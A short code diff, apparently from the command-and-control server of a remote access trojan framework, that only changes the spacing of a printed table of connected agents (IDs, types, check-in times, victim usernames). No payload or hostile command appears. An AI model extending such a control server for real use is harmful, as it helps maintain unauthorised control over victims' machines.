@@ -104,13 +104,13 @@ def serve_server(port=8080):
     app.run(host="0.0.0.0", port=port)
 
 def get_rats(current=""):
-    print("\n    agent id\ttype\tcheck-in\tusername")
-    print("    --------\t----\t--------\t--------")
+    print("\n    agent id \ttype\tcheck-in\tusername")
+    print("    ----------\t----\t--------\t--------")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            print(" "+colors(">>")+" "+ratID+"   \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
+            print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
         else:
-            print("    "+ratID+"   \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
+            print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
     print("")
 
 def remove_rat(ratID):
